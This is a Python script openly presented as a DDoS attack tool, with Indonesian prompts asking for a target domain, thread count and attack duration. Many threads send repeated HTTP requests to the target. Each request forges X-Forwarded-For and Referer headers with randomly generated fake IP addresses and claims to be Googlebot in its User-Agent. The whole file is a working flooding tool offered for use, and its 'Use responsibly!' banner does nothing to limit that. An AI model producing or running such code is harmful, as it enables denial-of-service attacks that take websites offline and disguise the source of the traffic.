import socket
import threading
import time
import random
import sys
import requests
from colorama import Fore, Style

# Banner
def banner():
    print(Fore.RED + """
               __            _____.__                
______  __ ___/  |____  ____/ ____\  | _____  ___.__.
\____ \|  |  \   __\  \/  /\   __\|  | \__  \<   |  |
|  |_> >  |  /|  |  >    <  |  |  |  |__/ __ \\___  |
|   __/|____/ |__| /__/\_ \ |__|  |____(____  / ____|
|__|                     \/                 \/\/     
═════╝ ╚═════╝ ╚══════╝╚═╝
""" + Style.RESET_ALL)

    print(Fore.GREEN + "  >> Coded By PutraXYOfficialxflay <<" + Style.RESET_ALL)
    print(Fore.YELLOW + "  >> DDOS Attack Tool <<" + Style.RESET_ALL)
    print(Fore.CYAN + "  >> Use responsibly! <<" + Style.RESET_ALL)
    print("-" * 40)

# Input
target_url = input(Fore.BLUE + """
      ⢀⣤⡀                               ⣤⡀      
     ⣰⠟⡿                                ⢹⡻⣧     
    ⣰⡇⢰⠁                                 ⣇⠘⣧ ⡀  
   ⣰⡏ ⢸                                  ⣿ ⢸⣧   
  ⢰⠃⢸⠄⠘⡄                                ⢀⡇ ⢾⠈⣧  
  ⢸⡄⢸⣄ ⢳⡀                               ⡼ ⢀⡏⢀⣟  
 ⢠⠿⡇⠈⣿⡀ ⠻⡄                            ⢀⡞⠁ ⣽⠇⢀⡟⡆ 
 ⢸ ⢻⠂⠸⣷⡀ ⠙⣦                          ⣠⠞ ⢀⣼⡟ ⡺ ⣹ 
 ⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀                     ⣠⠞⢡⡇⢀⣿⣯ ⣴⡗ ⣿⡀
⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆ ⠙⠢⣄                ⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
 ⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄ ⠈⠑⢦⡀           ⣠⠞⠁ ⣀⣴⠏ ⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
 ⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄ ⠹⡄        ⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇ 
  ⢸⠻⣆⠙⣿⣿⣿⣆ ⢻⣷⣾⣿⣅   ⣱        ⢸   ⢀⣽⣷⣾⡟ ⢀⣾⣿⣿⠋⣐⡾⣻  
  ⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇  ⢀⡞⠃        ⠈⠳⡆  ⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃  
   ⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋ ⠈⠳⣄⡀       ⣠⠾⠃ ⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏   
     ⠈⠙⠒⢬⡿⠋  ⣘⣿⣷⡟   ⢳      ⣸⠁  ⢘⣾⣿⣇⡀ ⠈⢻⡯⠔⠚⠉     
         ⠷⢤⡞⠉ ⣩⣿⣿⣾  ⠈⢣    ⣰⠃ ⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇        
          ⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄ ⢾⡁⠤⢤⡿⣿⠟⢧ ⠙⣦⣾⡗          
            ⠘⣶⣦⣧⣤⣏⣼          ⢳⣜⣧⣬⣧⣶⠏            
               ⠈⡉⠉⠁          ⠈⠉⢉⡉
     WELCOME TO TOOLS DDOS
     tools:ddos
     by: putraxyofficialxflay               
Masukkan Domain Target (contoh: example.com): """ + Style.RESET_ALL)
thread_count = int(input(Fore.BLUE + "Masukkan Jumlah Thread: " + Style.RESET_ALL))
duration = int(input(Fore.BLUE + "Masukkan Durasi Serangan (detik): " + Style.RESET_ALL))

fake_ip_list = []

# Generate IP palsu
def generate_fake_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

# Simpan 200 IP palsu
for _ in range(200):
    fake_ip_list.append(generate_fake_ip())

# Fungsi serangan
def attack():
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            ip = random.choice(fake_ip_list)
            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Referer': 'http://' + ip,
                'X-Forwarded-For': ip
            }
            response = requests.get("http://" + target_url, headers=headers)
            print(Fore.GREEN + f"Serangan dari IP: {ip} - Status: {response.status_code}" + Style.RESET_ALL)

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Koneksi gagal: {e}" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

        time.sleep(0.1)

# Main
if __name__ == "__main__":
    banner()
    threads = []

    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.YELLOW + "Serangan selesai!" + Style.RESET_ALL)
